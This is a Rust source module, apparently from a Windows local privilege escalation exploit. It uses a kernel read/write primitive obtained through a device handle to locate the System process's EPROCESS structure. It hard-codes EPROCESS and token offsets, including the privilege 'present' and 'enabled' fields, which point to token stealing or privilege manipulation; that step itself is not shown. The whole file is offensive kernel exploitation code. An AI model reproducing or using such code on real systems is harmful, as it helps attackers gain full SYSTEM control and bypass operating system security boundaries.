use anyhow::{bail, Context, Result};

use crate::device::Device;
use crate::kernel_rw::KernelRW;
use crate::utils::{find_export_va, find_mod, get_kernel_modules, ntoskrnl_disk_path};

pub const EPROC_UNIQUE_PID: u64 = 0x1D0;
pub const EPROC_ACTIVE_LINKS: u64 = 0x1D8;
pub const EPROC_TOKEN: u64 = 0x248;
pub const EPROC_IMAGE_FILENAME: u64 = 0x338;
pub const TOKEN_SEP_PRESENT: u64 = 0x40;
pub const TOKEN_SEP_ENABLED: u64 = 0x48;

pub fn read_image_filename(krw: &KernelRW, eproc: u64) -> Result<String> {
    let lo = krw.kread(eproc + EPROC_IMAGE_FILENAME)?;
    let hi = krw.kread(eproc + EPROC_IMAGE_FILENAME + 8)?;
    let mut bytes = [0u8; 15];
    bytes[0..8].copy_from_slice(&lo.to_le_bytes());
    bytes[8..15].copy_from_slice(&hi.to_le_bytes()[0..7]);
    let nul = bytes.iter().position(|&b| b == 0).unwrap_or(15);
    Ok(String::from_utf8_lossy(&bytes[..nul]).to_string())
}

pub fn resolve_system_eprocess(dev: &Device) -> Result<(KernelRW<'_>, u64)> {
    let mods = get_kernel_modules()?;
    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
    let path = ntoskrnl_disk_path(&mods)?;
    let pe = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;
    let ps_va = find_export_va(&pe, nt.va, "PsInitialSystemProcess")?;
    let krw = KernelRW::setup(dev, &pe, nt.va)?;
    let eproc = krw.kread(ps_va)?;
    if eproc < 0xFFFF_8000_0000_0000 {
        bail!("PsInitialSystemProcess kread returned bad value 0x{:016X}", eproc);
    }
    println!("[+] System EPROCESS=0x{:016X}", eproc);
    Ok((krw, eproc))
}
